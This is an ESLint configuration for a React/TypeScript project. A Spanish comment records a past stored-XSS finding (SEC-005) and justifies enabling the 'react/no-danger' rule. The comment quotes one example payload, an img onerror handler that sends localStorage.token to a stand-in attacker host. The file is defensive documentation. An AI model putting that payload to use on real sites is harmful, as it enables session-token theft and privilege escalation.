import js from '@eslint/js'
import globals from 'globals'
import react from 'eslint-plugin-react'
import reactHooks from 'eslint-plugin-react-hooks'
import reactRefresh from 'eslint-plugin-react-refresh'
import tseslint from 'typescript-eslint'

export default tseslint.config(
  { ignores: ['dist', 'coverage'] },
  {
    extends: [js.configs.recommended, ...tseslint.configs.recommended],
    files: ['**/*.{ts,tsx}'],
    languageOptions: {
      ecmaVersion: 2022,
      globals: globals.browser,
    },
    settings: {
      react: { version: 'detect' },
    },
    plugins: {
      react,
      'react-hooks': reactHooks,
      'react-refresh': reactRefresh,
    },
    rules: {
      ...reactHooks.configs.recommended.rules,
      'react-refresh/only-export-components': ['warn', { allowConstantExport: true }],

      /**
       * SEC-005 — el hallazgo se cierra aqui, por construccion.
       *
       * En v1 los campos que escribia el usuario (`event.title`,
       * `product.name`, `order.address`, `user.email`...) se insertaban con
       * `innerHTML` sin escapar, de modo que un usuario sin privilegios podia
       * crear un evento titulado
       *
       *   <img src=x onerror="fetch('//atacante/?t='+localStorage.token)">
       *
       * y el script se ejecutaba en la sesion de la administradora al abrir
       * el panel. Cadena completa: usuario normal -> administrador.
       *
       * React escapa por defecto, asi que la unica forma de reintroducir el
       * fallo es `dangerouslySetInnerHTML`. Esta regla lo convierte en un
       * error de lint, no en una decision que alguien pueda tomar con prisa.
       *
       * El segundo eslabon de la cadena ya lo corto D2: con la sesion en una
       * cookie HttpOnly no hay token que robar desde JavaScript.
       */
      'react/no-danger': 'error',

      '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
    },
  },
)
